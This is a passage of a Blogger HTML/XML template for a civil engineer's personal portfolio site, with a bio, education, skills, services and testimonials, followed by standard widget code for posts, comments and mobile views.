                    <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;                        + &quot;background-position: &quot;                        + data:backgroundPositionStyleStr + &quot;; &quot;                        + data:widthStyleStr                        + &quot;min-height: &quot; + data:height                        + &quot;_height: &quot; + data:height                        + &quot;background-repeat: no-repeat; &quot;' id='header-inner'>
                      <div class='titlewrapper' style='background: transparent'>
                        <h1 class='navbar-brand' style='background: transparent; border-width: 0px'>
                          <b:include name='title'/>
                        </h1>
                      </div>
                      <b:include name='description'/>
                    </div>
                  </b:if>
                  <b:else/>
                  <!--Show the image only-->
                  <div id='header-inner'>
                    <a expr:href='data:blog.homepageUrl' style='display: block'>
                      <img expr:alt='data:title' expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl' style='display: block'/>
                    </a>
                    <!--Show the description-->
                    <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
                      <b:include name='description'/>
                    </b:if>
                  </div>
                </b:if>
                <b:else/>
                <!--No header image -->
                <div id='header-inner'>
                  <div class='titlewrapper'>
                    <h1 class='navbar-brand'>
                      <b:include name='title'/>
                    </h1>
                  </div>
                  <b:include name='description'/>
                </div>
              </b:if>
            </b:includable>
            <b:includable id='description'>
              <div class='descriptionwrapper'>
                <p class='description'><span><data:description/></span></p>
              </div>
            </b:includable>
            <b:includable id='title'>
              <b:if cond='data:blog.url == data:blog.homepageUrl'>
                <data:title/>
                <b:else/>
                <a expr:href='data:blog.homepageUrl'><data:title/></a>
              </b:if>
            </b:includable>
          </b:widget>
        </b:section>

      </div>

      <!-- Collect the nav links, and other content for toggling -->
      <div class='collapse navbar-collapse tc_nav' id='bs-example-navbar-collapse-1'>

        <!-- links -->
        <ul class='nav navbar-nav navbar-right'>
          <!-- Top Nav -->
          <li><a class='active' href='#home'>Home</a></li>
          <li><a href='/#about'>About</a></li>
          <li><a href='/#services'>Services</a></li>
          <li><a href='/#clients'>Clients</a></li>
          <li><a href='/#work'>Portfolio</a></li>
          <li><a href='/#contact'>Contact</a></li>
        </ul>
      </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
  </nav>
  <!-- ====== End Navgition ======  -->

  <b:if cond='data:blog.pageType != &quot;item&quot;'>
    <b:if cond='data:blog.pageType != &quot;static_page&quot;'>

      <!-- ====== Header ======  -->
      <header class='tona-header' data-stellar-background-ratio='0.5' id='home'>
        <div class='header-overlay'>
          <!-- header content -->
          <div class='caption v-middle'>
            <!-- Header Name -->
            <h1>I LOVE TO SERVE THE CIVILS</h1>
            <div class='type'>
              <span>I AM</span><h2/>
            </div>
            <!-- Headline -->
            <script language='javascript' type='text/javascript'>//<![CDATA[
              $(function() {
                "use strict";
                $("header .caption h2").typed({
                  strings: ["A CIVIL ENGINEER"], 
                  loop: true,
                  startDelay: 1e3,
                  backDelay: 2e3
                });
              });
              //]]></script>
          </div>

          <div class='button-scroll' data-scrollTo='about'><span/></div>
        </div>
      </header>
      <!-- ====== End Header ======  -->

      <!-- ====== Hero ======  -->
      <section class='hero section-padding' id='about'>
        <div class='container mb-80'>
          <div class='row'>

            <!-- hero image -->
            <div class='col-sm-5 hero-admin'>
              <div class='hero-img'>
                <img alt='image' src='https://imgur.com/Q9yZ9FL'/>
              </div>
            </div>

            <!-- Avatar -->
            <div class='col-sm-7 col-sm-offset-1' style='margin-left: 0;'>
              <div class='hero-item'>
                <div class='tc-title tc_name_title'>
                  <!-- About Preword --> <div class='profile-preword'><span>Hello,</span></div>
                  <!-- About Name --> <h4>I&#39;m Er. Gagan Sharma</h4>
                </div>
                <div class='content mb-20'>
                  <!-- About Bio --> 
                  <p class='mb-20'>I have completed my Bachelor in Civil Engineering from Tribhuvan University, IOE, Paschimanchal Campus having Nepal Engineering Council License no. 23447 &quot;Civil&quot; &quot;A&quot; </p>
                  <p>My professional goal has been to cover the high drama of Civil Engineering to contribute compellingly about the way of corporate and entrepreneurial life. I&#39;ve always believed that the Engineering Profession is hardly dull but instead filled with great emotion, intellect, ego, and ambition. My goal has always been to capture both the glory and the folly of it. My ultimate aim as a Civil Engineer has been impending the world with impact, merely not a motley assortment.</p>
<p>After a combined desk-field career of nearly two and a half years--a span in which I managed a 1 million dollars worth private project, along with assisting in more than five projects worth a million dollars as a second-in-chief. I, now, am serving Nepal Government on contract. My goal had been to lead and motivate talented technicians, engineers, and designers, to shape an engineering marvel so that it is of the highest quality and integrity and differentiated in a very competitive marketplace. </p>
                </div>

                <!-- About Social Links -->
                <div class='social-icon'>
                  <a href='http://facebook.com/gaganshrma'>
                    <span><i aria-hidden='true' class='fa fa-facebook'/></span>
                  </a>
                  <a href='http://twitter.com/gagandai'>
                    <span><i aria-hidden='true' class='fa fa-twitter'/></span>
                  </a>
                  <a href='http://linkedin.com/gaganshrma'>
                    <span><i aria-hidden='true' class='fa fa-linkedin'/></span>
                  </a>
                </div>
                <!-- About Links --> 
                <div class='profile-btns'>
                  <a class='about-button' href='mailto:gaganshrma@hotmail.com'>Hire me</a>
                  <a class='about-button' href='https://drive.google.com/file/d/1PclAyKU3bmst5UIImCxBOV-UxpU7012M/view?usp=sharing'>Download CV</a>
                </div>
              </div>
            </div>
            <div class='clear-fix'/>
          </div>
        </div>

        <!-- Skills -->
        <div class='skills'>
          <div class='container'>
            <div class='row'>
              <div class='col-md-3 col-sm-4'>
                <div class='skill-items'>
                  <div class='skill-title'>
                    <span class='lnr lnr-pencil'/><br/>
                    <h5 class='tc-title'>Education</h5>
                  </div>

                  <div class='item-info mb-50'>
                    <h6>TU, IOE, Paschimanchal Campus</h6>
                    <p>Bachelor of Engineering in Civil</p>
                  </div>

                  <div class='item-info mb-50'>
                    <h6>Orcchid Science College</h6>
                    <p>+2 in Science</p>
                  </div>

                  <div class='item-info'>
                    <h6>Mount Everest HESBS</h6>
                    <p>SLC</p>
                  </div>

                </div>
              </div>

              <div class='col-md-3 col-sm-4'>
                <div class='skill-items'>
                  <div class='skill-title'>
                    <span class='lnr lnr-briefcase'/><br/>
                    <h5 class='tc-title'>Experience</h5>
                  </div>
			  	  <div class='item-info mb-50'>
                    <h6>Civil Engineering Professional</h6>
                    <p>NRA, District Level Project Implementation Unit</p>  
					<p>(Grant Management and Local Infrastructures)</p>
                    <p>(Jan to April 2018)</p></div>
				  <div class='item-info mb-50'>
                    <h6>Project Engineer</h6>
                    <p>Mahavir Shree International Pvt. Ltd.</p>
                    <p>(Sept 2018 to Dec 2019)</p></div>
                  <div class='item-info mb-50'>
                    <h6>Civil Engineer</h6>
                    <p>Pagoda Developers</p>
                    <p>(Jan to Aug 2018)</p>
                  </div>
                </div>
              </div>

              <!-- Skills Progress -->
              <div class='col-md-6 col-sm-4'>
                <div class='skill-items'>
                  <div class='skill-title'>
                    <span class='lnr lnr-spell-check'/><br/>
                    <h5 class='tc-title'>My Skills</h5>
                  </div>

                  <div class='item-info mb-30'>
                    <h6>AutoCAD, Autodesk Revit, SketchUp, GIS</h6>
                    <div class='skills-progress'><span data-value='90%'/></div>
                  </div>

                  <div class='item-info mb-30'>
                    <h6>SAP2000, Staad Pro, ROBOT Analysis</h6>
                    <div class='skills-progress'><span data-value='80%'/></div>
                  </div>

                  <div class='item-info mb-30'>
                    <h6>MS Office(Word, Powerpoint, Excel), MS Project</h6>
                    <div class='skills-progress'><span data-value='90%'/></div>
                  </div>

                  <div class='item-info'>
                    <h6>Theodolite, Total Station, GPS</h6>
                    <div class='skills-progress'><span data-value='100%'/></div>
                  </div>

                </div>
              </div>

            </div>
          </div>
        </div>
      </section>
      <!-- ====== End Hero ======  -->

      <!-- ====== Services ====== -->
      <section class='services text-center section-padding' id='services'>
        <div class='container mb-80'>

          <!-- section header -->
          <div class='text-center mb-50'>
            <h4 class='tc-title tc-title-center'>WHAT CAN I DO</h4>
          </div>
          <div class='row'>

            <!-- services items -->
            <div class='services-items'>
              <div class='col-md-4'>
                <div class='item'>
                  <span class='lnr lnr-laptop-phone'/>
                  <h5>Structural Analysis of Structures</h5>
                  <p>Complete Structural Analysis of the purposed structure against all failures and according to the design requirements as per IS and NBC using softwares such as SAP2000, Staad Pro and/or ROBOT Analysis</p>
                </div>
              </div>

              <div class='col-md-4 bord'>
                <div class='item'>
                  <span class='lnr lnr-phone'/>
				  <h5>Consultant</h5>
                  <p>Strong Guidance on the best possible method of Engineering, Detailed Project Reports, Evaluation of Projects</p>
                </div>
              </div>

              <div class='col-md-4'>
                <div class='item'>
                  <span class='lnr lnr-diamond'/>
                  <h5>Surveying </h5>
                  <p>Use of Surveying skills to find the unknown result using tools such as Theodolite, Total Station, Automatic Levelling Machine, GPS </p>
                </div>
              </div>
            </div>

            <div class='services-items'>
              <div class='col-md-4'>
                <div class='item'>
                  <span class='lnr lnr-layers'/>
                  <h5>AutoCAD Drafting</h5>
                  <p>Full Drafting of Purposed Structure with detailed reinforcement drawings.</p>
                </div>
              </div>

              
            </div>

          </div>
        </div>
      </section>
      <!--====== End Services ======-->

      <!-- ====== Clients ====== -->
      <section class='clients mb-50' id='clients'>
        <div class='container'>
          <div class='row'>

            <!-- clients carousel -->
            <div class='col-md-10 col-md-offset-1'>
              <div class='client-say text-center'>
                <div class='owl-carousel owl-theme'>

                  <!-- client item -->
                  <div class='client-item text-center'>

                    <span class='icon-quote'/><br/>

                    <h5 class='mb-30'>WHAT PEOPLE SAY ?</h5>

                    <p class='mb-20'> He&#39;s got what he says. Satisfied with my house design. Thanks</p>

                    <h6>___ Niranjan Adhikari ___</h6>
                  </div>

                  <!-- client item -->
                  <div class='client-item text-center'>

                    <span class='icon-quote'/><br/>

                    <h5 class='mb-30'>WHAT PEOPLE SAY ?</h5>

                    <p class='mb-20'>He clears my confusions whenever I got one on my project. Such a simple use of technical language for someone non-technical. Thanks!.</p>

                    <h6>___ Baburam Devkota ___</h6>
                  </div>

                  <!-- client item -->
                  <div class='client-item text-center'>

                    <span class='icon-quote'/><br/>

                    <h5 class='mb-30'>WHAT PEOPLE SAY ?</h5>

                    <p class='mb-20'>Gave him a deadline and he completed the project in nearly half. Such a dedication! </p>

                    <h6>___ Sujit Koirala ___</h6>
                  </div>

                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      <!--====== End Clients ======-->

    </b:if>
  </b:if>

  <div class='clr'/>

  <!-- ====== Work ====== -->
  <div class='work section-padding' id='work'>
    <div class='container'>
      <b:if cond='data:blog.pageType != &quot;item&quot;'>
        <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
 
        </b:if>
      </b:if>
      <div class='work-inner'>
        <!-- START SINGLE WORK DESIGN AREA -->
        <div class='outer-wrapper'>
          <div class='main-wrapper'>
            <b:section class='content' id='content' showaddelement='no'>
              <b:widget id='Blog1' locked='false' title='Blog Posts' type='Blog' version='1'>
                <b:widget-settings>
                  <b:widget-setting name='showDateHeader'>true</b:widget-setting>
                  <b:widget-setting name='style.textcolor'>#ffffff</b:widget-setting>
                  <b:widget-setting name='showShareButtons'>true</b:widget-setting>
                  <b:widget-setting name='authorLabel'>By</b:widget-setting>
                  <b:widget-setting name='showCommentLink'>true</b:widget-setting>
                  <b:widget-setting name='style.urlcolor'>#ffffff</b:widget-setting>
                  <b:widget-setting name='showAuthor'>false</b:widget-setting>
                  <b:widget-setting name='style.linkcolor'>#ffffff</b:widget-setting>
                  <b:widget-setting name='style.unittype'>TextAndImage</b:widget-setting>
                  <b:widget-setting name='style.bgcolor'>#ffffff</b:widget-setting>
                  <b:widget-setting name='reactionsLabel'/>
                  <b:widget-setting name='showAuthorProfile'>false</b:widget-setting>
                  <b:widget-setting name='style.layout'>1x1</b:widget-setting>
                  <b:widget-setting name='showLabels'>true</b:widget-setting>
                  <b:widget-setting name='showLocation'>true</b:widget-setting>
                  <b:widget-setting name='showTimestamp'>true</b:widget-setting>
                  <b:widget-setting name='postsPerAd'>1</b:widget-setting>
                  <b:widget-setting name='showBacklinks'>false</b:widget-setting>
                  <b:widget-setting name='style.bordercolor'>#ffffff</b:widget-setting>
                  <b:widget-setting name='showInlineAds'>false</b:widget-setting>
                  <b:widget-setting name='showReactions'>false</b:widget-setting>
                </b:widget-settings>
                <b:includable id='main' var='top'>

                  <!-- Image Append -->

                  <!-- Image Append For Post -->
                  <b:if cond='data:blog.pageType == &quot;item&quot;'>
                    <div class='big_post_image' id='pic1'/>
                  </b:if>
                  <!-- Image Append For Page -->
                  <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
                    <div class='big_post_image' id='pic1'/>
                  </b:if>

                  <!-- Image Append END. -->

                  <b:if cond='data:mobile == &quot;false&quot;'>

                    <!-- error-page -->
                    <b:if cond='data:blog.pageType == &quot;error_page&quot;'>
                      <b:include name='error-page'/>
                    </b:if>

                    <!-- status-message -->
                    <b:if cond='data:blog.pageType != &quot;error_page&quot;'>
                      <b:include data='top' name='status-message'/>
                    </b:if>

                    <!-- posts -->
                    <div class='blog-posts hfeed row work-posts grid'>
                      <data:defaultAdStart/>
                      <b:loop values='data:posts' var='post'>

                        <b:if cond='data:blog.pageType != &quot;index&quot;'>
                          <b:if cond='data:blog.pageType != &quot;archive&quot;'>
                            <b:if cond='data:post.dateHeader'>
                              <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
                            </b:if>
                          </b:if>
                        </b:if>

                        <div class='date-outer col-md-4 col-sm-4'>
                          <b:include data='post' name='post'/>
                          <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
                            <b:include data='post' name='comment_picker'/>
                          </b:if>
                          <b:if cond='data:blog.pageType == &quot;item&quot;'>
                            <b:include data='post' name='comment_picker'/>
                          </b:if>
                        </div>

                        <b:if cond='data:post.includeAd'>
                          <b:if cond='data:post.isFirstPost'>
                            <data:defaultAdEnd/>
                            <b:else/>
                            <data:adEnd/>
                          </b:if>
                          <div class='inline-ad'>
                            <data:adCode/>
                          </div>
                          <data:adStart/>
                        </b:if>
                      </b:loop>

                      <b:if cond='data:numPosts != 0'>

                      </b:if>
                      <data:adEnd/>
                    </div>

                    <!-- navigation -->
                    <b:if cond='data:blog.pageType == &quot;index&quot;'>
                      <b:include name='nextprev'/>
                    </b:if>              
                    <!-- feed links -->

                    <b:if cond='data:top.showStars'>
                      <script src='//www.google.com/jsapi' type='text/javascript'/>
                      <script type='text/javascript'>
                        google.load(&quot;annotations&quot;, &quot;1&quot;, {&quot;locale&quot;: &quot;<data:top.languageCode/>&quot;});
                        function initialize() {
                          google.annotations.setApplicationId(<data:top.blogspotReviews/>);
                          google.annotations.createAll();
                          google.annotations.fetch();
                        }
                        google.setOnLoadCallback(initialize);
                      </script>
                    </b:if>

                    <b:else/>
                    <b:include name='mobile-main'/>
                  </b:if>

                  <b:if cond='data:top.showDummy'>
                    <data:top.dummyBootstrap/>
                  </b:if>

                </b:includable>
                <b:includable id='authorblog'>
                  <div id='author-box'>
                    <div class='block-head'>
                      <h3>
                        About 
                        <data:post.author/>
                      </h3>
                      <div class='stripe-line'/>
                    </div>
                    <div class='post-listing'>
                      <div class='author-avatar'>
                        <img class='author_avatar' expr:alt='data:post.author' expr:src='data:post.authorPhoto.url' height='80' width='80'/>
                      </div>
                      <div class='author-description'>
                        <data:post.authorAboutMe/>   
                      </div>
                      <div class='clear'/>
                    </div>
                  </div>
                  <!--/entry author-->
                </b:includable>
                <b:includable id='backlinkDeleteIcon' var='backlink'>
                  <span expr:class='&quot;item-control &quot; + data:backlink.adminClass'>
                    <a expr:href='data:backlink.deleteUrl' expr:title='data:top.deleteBacklinkMsg'>
                      <img src='//www.blogger.com/img/icon_delete13.gif'/>
                    </a>
                  </span>
                </b:includable>
                <b:includable id='backlinks' var='post'>
                  <a name='links'/>
                  <h4>
                    <data:post.backlinksLabel/>
                  </h4>
                  <b:if cond='data:post.numBacklinks != 0'>
                    <dl class='comments-block' id='comments-block'>
                      <b:loop values='data:post.backlinks' var='backlink'>
                        <div class='collapsed-backlink backlink-control'>
                          <dt class='comment-title'>
                            <span class='backlink-toggle-zippy'>
                              &#160;
                            </span>
                            <a expr:href='data:backlink.url' rel='nofollow'>
                              <data:backlink.title/>
                            </a>
                            <b:include data='backlink' name='backlinkDeleteIcon'/>
                          </dt>
                          <dd class='comment-body collapseable'>
                            <data:backlink.snippet/>
                          </dd>
                          <dd class='comment-footer collapseable'>
                            <span class='comment-author'>
                              <data:post.authorLabel/>
                              <data:backlink.author/>
                            </span>
                            <span class='comment-timestamp'>
                              <data:post.timestampLabel/>
                              <data:backlink.timestamp/>
                            </span>
                          </dd>
                        </div>
                      </b:loop>
                    </dl>
                  </b:if>
                  <p class='comment-footer'>
                    <a class='comment-link' expr:href='data:post.createLinkUrl' expr:id='data:widget.instanceId + &quot;_backlinks-create-link&quot;' target='_blank'>
                      <data:post.createLinkLabel/>
                    </a>
                  </p>
                </b:includable>
                <b:includable id='comment-form' var='post'>
                  <div class='comment-form'>
                    <a name='comment-form'/>
                    <b:if cond='data:mobile'>
                      <h4 id='comment-post-message'>
                        <a expr:id='data:widget.instanceId + &quot;_comment-editor-toggle-link&quot;' href='javascript:void(0)'>
                          <data:postCommentMsg/>
                        </a>
                      </h4>
                      <div class='pesan-komentar'>
                        <p>
                          <data:blogCommentMessage/>
                        </p>
                      </div>
                      <data:blogTeamBlogMessage/>
                      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
                      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
                      <b:else/>
                      <h4 id='comment-post-message'>
                        <data:postCommentMsg/>
                      </h4>
                      <div class='pesan-komentar'>
                        <p>
                          <data:blogCommentMessage/>
                        </p>
                      </div>
                      <data:blogTeamBlogMessage/>
                      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
                      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
                    </b:if>
                    <data:post.friendConnectJs/>
                    <data:post.cmtfpIframe/>
                    <script type='text/javascript'>
                      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;, &#39;<data:post.communityId/>&#39;);
                    </script>
                  </div>
                </b:includable>
                <b:includable id='commentDeleteIcon' var='comment'>
                  <span expr:class='&quot;item-control &quot; + data:comment.adminClass'>
                    <b:if cond='data:showCmtPopup'>
                      <div class='goog-toggle-button'>
                        <div class='goog-inline-block comment-action-icon'/>
                      </div>
                      <b:else/>
                      <a class='comment-delete' expr:href='data:comment.deleteUrl' expr:title='data:top.deleteCommentMsg'>
                        <img src='//www.blogger.com/img/icon_delete13.gif'/>
                      </a>
                    </b:if>
                  </span>
                </b:includable>
                <b:includable id='comment_count_picker' var='post'>
                  <b:if cond='data:post.commentSource == 1'>
                    <span class='cmt_count_iframe_holder' expr:data-count='data:post.numComments' expr:data-onclick='data:post.addCommentOnclick' expr:data-post-url='data:post.url' expr:data-url='data:post.canonicalUrl'>
                    </span>
                    <b:else/>
                    <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
                      <data:post.commentLabelFull/>
                      :
                    </a>
                  </b:if>
                </b:includable>
                <b:includable id='comment_picker' var='post'>
                  <b:if cond='data:post.commentSource == 1'>
                    <b:include data='post' name='iframe_comments'/>
                    <b:else/>
                    <b:if cond='data:post.showThreadedComments'>
                      <b:include data='post' name='threaded_comments'/>
                      <b:else/>
                      <b:include data='post' name='comments'/>
                    </b:if>
                  </b:if>
                </b:includable>
                <b:includable id='comments' var='post'>
                  <div id='top-comment'>

                    <div class='widget2' id='top-comment1'> 

                      <div class='centerare1'>

                        <div class='comments' id='comments'>

                          <a name='comments'/>
                          <b:if cond='data:post.allowComments'>
                            <div class='komhead'>
                              <h4>
                                <b:if cond='data:post.numComments == 1'>
                                  1 <data:commentLabel/>:
                                  <b:else/>
                                  <data:post.numComments/> <data:commentLabelPlural/>:
                                </b:if>
                              </h4>
                              <div class='stripe-line'/>
                            </div>
                            <b:if cond='data:post.commentPagingRequired'>
                              <span class='paging-control-container'>
                                <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'><data:post.oldestLinkText/></a>
                                &#160;
                                <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'><data:post.olderLinkText/></a>
                                &#160;
                                <data:post.commentRangeText/>
                                &#160;
                                <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'><data:post.newerLinkText/></a>
                                &#160;
                                <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'><data:post.newestLinkText/></a>
                              </span>
                            </b:if>

                            <div expr:id='data:widget.instanceId + &quot;_comments-block-wrapper&quot;'>
                              <dl expr:class='data:post.avatarIndentClass' id='comments-block'>
                                <b:loop values='data:post.comments' var='comment'>
                                  <dt expr:class='&quot;comment-author &quot; + data:comment.authorClass' expr:id='data:comment.anchorName'>
                                    <b:if cond='data:comment.favicon'>
                                      <img expr:src='data:comment.favicon' height='16px' style='margin-bottom:-2px;' width='16px'/>
                                    </b:if>
                                    <a expr:name='data:comment.anchorName'/>
                                    <b:if cond='data:blog.enabledCommentProfileImages'>
                                      <data:comment.authorAvatarImage/>
                                    </b:if>
                                    <b:if cond='data:comment.authorUrl'>
                                      <a expr:href='data:comment.authorUrl' rel='nofollow'><data:comment.author/></a>
                                      <b:else/>
                                      <data:comment.author/>
                                    </b:if>
                                    <data:commentPostedByMsg/>
                                  </dt>
                                  <dd class='comment-body' expr:id='data:widget.instanceId + data:comment.cmtBodyIdPostfix'>
                                    <b:if cond='data:comment.isDeleted'>
                                      <span class='deleted-comment'><data:comment.body/></span>
                                      <b:else/>
                                      <p>
                                        <data:comment.body/>
                                      </p>
                                    </b:if>
                                  </dd>
                                  <dd class='comment-footer'>
                                    <span class='comment-timestamp'>
                                      <a expr:href='data:comment.url' title='comment permalink'>
                                        <data:comment.timestamp/>
                                      </a>
                                      <b:include data='comment' name='commentDeleteIcon'/>
                                    </span>
                                  </dd>
                                </b:loop>
                              </dl>
                            </div>

                            <b:if cond='data:post.commentPagingRequired'>
                              <span class='paging-control-container'>
                                <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'>
                                  <data:post.oldestLinkText/>
                                </a>
                                <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'>
                                  <data:post.olderLinkText/>
                                </a>
                                &#160;
                                <data:post.commentRangeText/>
                                &#160;
                                <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'>
                                  <data:post.newerLinkText/>
                                </a>
                                <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'>
                                  <data:post.newestLinkText/>
                                </a>
                              </span>
                            </b:if>

                            <p class='comment-footer'>
                              <b:if cond='data:post.embedCommentForm'>
                                <b:if cond='data:post.allowNewComments'>
                                  <b:include data='post' name='comment-form'/>
                                  <b:else/>
                                  <data:post.noNewCommentsText/>
                                </b:if>
                                <b:else/>
                                <b:if cond='data:post.allowComments'>
                                  <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
                                </b:if>
                              </b:if>

                            </p>
                          </b:if>
                          <b:if cond='data:showCmtPopup'>
                            <div id='comment-popup'>
                              <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
                              </iframe>
                            </div>
                          </b:if>

                          <div id='backlinks-container'>
                            <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
                              <b:if cond='data:post.showBacklinks'>
                                <b:include data='post' name='backlinks'/>
                              </b:if>
                            </div>
                          </div>
                        </div>

                      </div>

                    </div>


                  </div>
                </b:includable>
                <b:includable id='feedLinks'>
                  <b:if cond='data:blog.pageType != &quot;item&quot;'>
                    <!-- Blog feed links -->
                    <b:if cond='data:feedLinks'>
                      <div class='blog-feeds'>
                        <b:include data='feedLinks' name='feedLinksBody'/>
                      </div>
                    </b:if>
                    <b:else/>
                    <!--Post feed links -->
                    <div class='post-feeds'>
                      <b:loop values='data:posts' var='post'>
                        <b:if cond='data:post.allowComments'>
                          <b:if cond='data:post.feedLinks'>
                            <b:include data='post.feedLinks' name='feedLinksBody'/>
                          </b:if>
                        </b:if>
                      </b:loop>
                    </div>
                  </b:if>
                </b:includable>
                <b:includable id='feedLinksBody' var='links'>
                  <div class='feed-links'>
                    <data:feedLinksMsg/>
                    <b:loop values='data:links' var='f'>
                      <a class='feed-link' expr:href='data:f.url' expr:type='data:f.mimeType' target='_blank'>
                        <data:f.name/>
                        (
                        <data:f.feedType/>
                        )
                      </a>
                    </b:loop>
                  </div>
                </b:includable>
                <b:includable id='iframe_comments' var='post'>
                  <b:if cond='data:post.allowIframeComments'>
                    <script expr:src='data:post.iframeCommentSrc' type='text/javascript'/>
                    <div class='cmt_iframe_holder' expr:data-href='data:post.canonicalUrl' expr:data-viewtype='data:post.viewType'/>
                    <b:if cond='data:post.embedCommentForm == &quot;false&quot;'>
                      <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
                        <data:postCommentMsg/>
                      </a>
                    </b:if>
                  </b:if>
                </b:includable>
                <b:includable id='mobile-index-post' var='post'>
                  <!-- MOBILE INDEX POST HERE -->
                  <div class='mobile-date-outer date-outer'>
                    <div class='mobile-post-outer'>
                      <div class='mobile-index-contents'>
                        <b:if cond='data:post.thumbnailUrl'>
                          <div class='mobile-index-thumbnail'>
                            <div class='Image'>
                              <img expr:src='data:post.thumbnailUrl'/>
                            </div>
                          </div>
                          <b:else/>
                          <div class='mobile-index-thumbnail'>
                            <div class='Image'>
                              <img expr:alt='data:post.title' expr:title='data:post.title' src='http://3.bp.blogspot.com/-ltyYh4ysBHI/U04MKlHc6pI/AAAAAAAADQo/PFxXaGZu9PQ/s66-c/no-image.png'/>
                            </div>
                          </div>
                        </b:if>
                        <a expr:href='data:post.url'>
                          <h3 class='mobile-index-title entry-title' itemprop='headline'>
                            <data:post.title/>
                          </h3>
                        </a>
                        <div class='post-body'>
                          <div class='post-info'>
                            <b:if cond='data:top.showAuthor'>
                              <b:if cond='data:post.authorProfileUrl'>
                                <span class='author-info'>
                                  By
                                  <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                                    <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                                    <a class='g-profile' expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                                      <span itemprop='name'>
                                        <data:post.author/>
                                      </span>
                                    </a>
                                  </span>
                                </span>
                                <b:else/>
                                <span class='author-info'>
                                  <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                                    <span itemprop='name'>
                                      <data:post.author/>
                                    </span>
                                  </span>
                                </span>
                              </b:if>
                            </b:if>
                            <b:if cond='data:top.showTimestamp'>
                              <b:if cond='data:post.url'>
                                <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
                                <span class='time-info'>
                                  <i class='fa fa-calendar'/>
                                  <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'>
                                    <abbr class='published updated' expr:title='data:post.timestampISO8601' itemprop='datePublished'>
                                      <data:post.timestamp/>
                                    </abbr>
                                  </a>
                                </span>
                              </b:if>
                            </b:if>
                            <b:if cond='data:blog.pageType != &quot;item&quot;'>
                              <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                                <b:if cond='data:post.allowComments'>
                                  <span class='comment-info'>
                                    <i class='fa fa-comments'/>
                                    <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
                                      <b:if cond='data:post.numComments == 0'>
                                        Add Comment 
                                      </b:if>
                                      <b:if cond='data:post.numComments == 1'>
                                        1 Comment 
                                      </b:if>
                                      <b:if cond='data:post.numComments &gt; 1'>
                                        <data:post.numComments/>
                                        Comments 
                                      </b:if>
                                    </a>
                                  </span>
                                </b:if>
                              </b:if>
                            </b:if>
                          </div>
                        </div>
                      </div>
                      <div style='clear: both;'/>
                    </div>
                  </div>
                </b:includable>
                <b:includable id='mobile-main' var='top'>
                  <!-- posts -->
                  <div class='blog-posts hfeed'>
                    <b:include data='top' name='status-message'/>
                    <b:if cond='data:blog.pageType == &quot;index&quot;'>
                      <b:loop values='data:posts' var='post'>
                        <b:include data='post' name='mobile-index-post'/>
                      </b:loop>
                      <b:else/>
                      <b:loop values='data:posts' var='post'>
                        <b:include data='post' name='mobile-post'/>
                      </b:loop>
                    </b:if>
                  </div>
                  <b:include name='mobile-nextprev'/>
                </b:includable>
                <b:includable id='mobile-nextprev'>
                  <!-- MOBILE PAGE NAVIGATION LINKS HERE -->
                  <div class='blog-pager' id='blog-pager'>
                    <b:if cond='data:newerPageUrl'>
                      <div class='mobile-link-button' id='blog-pager-newer-link'>
                        <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>
                          &amp;lsaquo;
                        </a>
                      </div>
                    </b:if>
                    <b:if cond='data:olderPageUrl'>
                      <div class='mobile-link-button' id='blog-pager-older-link'>
                        <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>
                          &amp;rsaquo;
                        </a>
                      </div>
                    </b:if>
                    <div class='mobile-link-button' id='blog-pager-home-link'>
                      <a class='home-link' expr:href='data:blog.homepageUrl'>
                        <data:homeMsg/>
                      </a>
                    </div>
                    <div class='mobile-desktop-link'>
                      <a class='home-link' expr:href='data:desktopLinkUrl'>
                        <data:desktopLinkMsg/>
                      </a>
                    </div>
                  </div>
                  <div class='clear'/>
                </b:includable>
                <b:includable id='mobile-post' var='post'>
                  <!-- MOBILE ITEM POST HERE -->
